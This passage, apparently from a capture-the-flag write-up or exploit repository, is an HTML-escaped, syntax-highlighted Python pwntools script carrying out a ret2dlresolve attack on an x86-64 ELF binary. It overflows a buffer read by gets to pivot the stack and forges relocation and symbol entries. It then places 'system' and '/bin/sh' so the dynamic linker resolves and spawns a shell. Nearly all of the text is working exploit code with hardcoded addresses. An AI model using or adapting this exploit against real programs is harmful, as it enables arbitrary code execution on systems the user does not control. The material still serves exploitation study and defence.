&lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dynamic_value_by_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DT_SYMTAB&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;FUNCTION_NAMES_LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dynamic_value_by_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DT_STRTAB&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RESOLVER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x401020&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000404f10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;FINAL_STACK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000404da0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;STRING_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;REL_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;

&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
// Relocation entry, without explicit addend.
struct Elf64_Rel {
  Elf64_Addr r_offset; // Location (file byte offset, or program virtual addr).
  Elf64_Xword r_info;  // Symbol table index and type of relocation to apply.
 
  // These accessors and mutators correspond to the ELF64_R_SYM, ELF64_R_TYPE,
  // and ELF64_R_INFO macros defined in the ELF specification:
  Elf64_Word getSymbol() const { return (r_info &amp;gt;&amp;gt; 32); }
  Elf64_Word getType() const { return (Elf64_Word)(r_info &amp;amp; 0xffffffffL); }
  void setSymbol(Elf64_Word s) { setSymbolAndType(s, getType()); }
  void setType(Elf64_Word t) { setSymbolAndType(getSymbol(), t); }
  void setSymbolAndType(Elf64_Word s, Elf64_Word t) {
    r_info = ((Elf64_Xword)s &amp;lt;&amp;lt; 32) + (t &amp;amp; 0xffffffffL);
  }
};
&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_rel_entry_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Replace gets
# Calculation would be ELF64_SYM_LIST + index * sizeof(Elf64_Sym), being the size 24
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# We need to assert the address is divisible by Elf64_Sym size (24)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_rel_entry_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fake_rel_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_rel_entry_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_rel_entry_info&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;REL_ENTRY_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF64_REL_LIST&lt;/span&gt;

&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
// Symbol table entries for ELF64.
struct Elf64_Sym {
  Elf64_Word st_name;     // Symbol name (index into string table)
};
 
// The size (in bytes) of symbol table entries.
enum {
  SYMENTRY_SIZE64 = 24  // 64-bit symbol entry size.
};
&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;fake_sym_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;STRING_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FUNCTION_NAMES_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
_dl_fixup(link_map, index) {
    Elf64_Rel *rel_entry = JMPREL[index] ;
    Elf64_Sym *sym_entry = SYMTAB[rel_entry-&amp;gt;getSymbol()];
    char *sym_name = STRTAB + sym_entry -&amp;gt; st_name ;
    void *symbol_address = _dl_fixup(link_map, sym_name);
    // now call the resolved symbol
    _dl_lookup_symbol_x(arg1, arg2...)
}
&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Stack pivot 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Stack pivoting performed to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] REL LIST ADDR: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF64_REL_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] SYM LIST ADDR: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF64_SYM_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] STR LIST ADDR: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FUNCTION_NAMES_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Setting &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;STRING_ADDRESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Setting El64_Sym at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYM_ENTRY_ADDRESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    * String index at: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;STRING_ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FUNCTION_NAMES_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Setting El64_Rel at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;REL_ENTRY_ADDRESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    * Replacing gets at: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;    * Fake index is at: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; :: final r_info: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FINAL_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# The resolve functions will use a lot of memory, we need as much room as we can get.
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_sym_entry&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_rel_entry&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
